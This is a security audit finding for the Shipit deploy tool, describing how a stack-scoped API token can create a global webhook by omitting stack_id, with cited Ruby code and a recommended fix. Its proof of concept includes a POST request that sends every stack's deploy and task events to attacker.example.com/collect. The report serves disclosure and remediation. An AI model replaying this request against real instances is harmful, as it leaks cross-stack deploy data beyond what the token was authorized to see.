### Title
Stack-scoped ApiClient token can create a global webhook, escalating write:hook scope beyond its authorized stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The `Hook` model supports two binding levels: a hook scoped to a specific `stack_id`, and a "global" hook (`stack_id: nil`) that receives events for **every** stack in the instance [1](#0-0) . `Api::HooksController#stack_id` treats the stack binding as optional rather than deriving it from the authenticated `ApiClient`'s own scope: if the caller simply omits the `stack_id` request parameter, the hook is created with `stack_id: nil`, i.e. global, and the only authorization check performed is the coarse `write:hook` permission flag - never a check that the client's own `stack_id` (if scoped) equals the stack the hook targets.

### Finding Description
`Api::BaseController#stacks` correctly restricts the visible/actionable stacks for a stack-scoped `ApiClient`: [2](#0-1) 

This scoping is only exercised through `stack`, which calls `stacks.from_param!(params[:stack_id])`. `Api::HooksController` derives its own `stack_id` helper on top of that, but only invokes `stack` (and therefore the scope check) when `params[:stack_id]` is present: [3](#0-2) 

Permission enforcement for `create`/`update`/`destroy` is a flat scope check unrelated to which stack (or "no stack") is targeted: [4](#0-3) [5](#0-4) 

Because `stack_id` silently becomes `nil` when the parameter is simply left out of the request, `hooks.create(params)` builds a `Hook` with `stack_id: nil` — a global hook. `Hook.global` and `Hook.for_stack` show that global hooks are delivered for **every** stack's events (`stack`, `deploy`, `rollback`, `task`, `merge`, `lock`, `commit_status`, `pull_request`, etc.), not just the stack the `ApiClient` was scoped to: [6](#0-5) 

This breaks exactly the binding equality called out for this class of bug: `ApiClient.stack_id` (the single stack the token was authorised for) is supposed to equal the `stack_id` of any resource the token's write operations touch. Instead, an omitted parameter defaults to the unscoped/global case, so a token that was only ever granted access to one stack can create a hook whose `stack_id` is `nil`, and thereby "touches" (receives event payloads from) every stack in the deployment — including stacks the token was never authorized to see.

### Impact Explanation
A stack-scoped `ApiClient` (e.g. the fixture `here_come_the_walrus`, scoped to a single stack with `write:hook` in its permission list — see `test/fixtures/shipit/api_clients.yml`) can register a delivery URL that receives `deploy`, `task`, `rollback`, `merge`, `commit_status`, and `pull_request` event payloads for every stack managed by the Shipit instance, not just the one it is bound to. This is an authorization-scope escalation resulting in unauthorized cross-stack read of deploy/task state and output metadata (SHAs, environment names, statuses, lock reasons, user logins) for stacks the client has no legitimate visibility into — matching the High-severity class "escalation ... unauthenticated read of stack state, task streams or deploy output" defined in this scan's rules, since the disclosure crosses an authorization boundary the token was explicitly meant to respect.

### Likelihood Explanation
Likelihood is high for any deployment that issues stack-scoped `ApiClient` tokens with `write:hook` permission (a legitimate, documented combination — see `ApiClient::PERMISSIONS` and the `here_come_the_walrus` fixture pattern) to less-trusted integrations. Exploiting it requires no special access beyond the token the client already legitimately holds; it only requires omitting one optional request parameter (`stack_id`) on `POST /hooks`.

### Recommendation
`Api::HooksController#stack_id` (and the `hooks` scoping it feeds) should not treat the stack binding as optional when the authenticated `ApiClient` is itself stack-scoped. Concretely: if `current_api_client.stack_id?` is true, force `stack_id` to `current_api_client.stack_id` (ignoring/rejecting any client-supplied value that disagrees), and only allow creation of a global (`stack_id: nil`) hook for unscoped clients (`current_api_client.stack_id?` false). This restores the equality between "the stack the token authorises" and "the stack(s) the created resource touches."

### Proof of Concept
1. Create an `ApiClient` scoped to `Stack A` with permission `write:hook` (mirrors the `here_come_the_walrus` fixture pattern: `stack: <stack_a>`, `permissions: ['write:hook']`).
2. Authenticate as that client and send:
   ```
   POST /hooks
   Authorization: Basic <token for the stack-A-scoped client>
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "rollback", "merge"]
   }
   ```
   Note: no `stack_id` is supplied.
3. `Api::HooksController#stack_id` evaluates `params[:stack_id].present?` as `false`, so `stack_id` is `nil`; `hooks.create(params)` persists a `Hook` with `stack_id: nil`.
4. Any subsequent `deploy`/`task`/`rollback`/`merge` event on **any** stack in the instance (e.g. Stack B, which the client was never authorized to access) is delivered to `https://attacker.example.com/collect` via `Hook.for_stack`/`Hook.deliver`, confirming cross-stack disclosure beyond the token's authorized scope.

### Citations

**File:** app/models/shipit/hook.rb (L70-119)
```ruby
    EVENTS = %w[
      stack
      review_stack
      task
      deploy
      rollback
      lock
      commit_status
      deployable_status
      merge_status
      merge
      pull_request
    ].freeze

    belongs_to :stack, required: false
    has_many :deliveries

    validates :delivery_url, presence: true, url: { no_local: true, allow_blank: true }
    validates :content_type, presence: true, inclusion: { in: CONTENT_TYPES.keys }
    validates :events, presence: true, subset: { of: EVENTS }

    serialize :events, coder: Shipit::CSVSerializer

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L5-8)
```ruby
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

```

**File:** app/controllers/shipit/api/hooks_controller.rb (L40-52)
```ruby
      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```
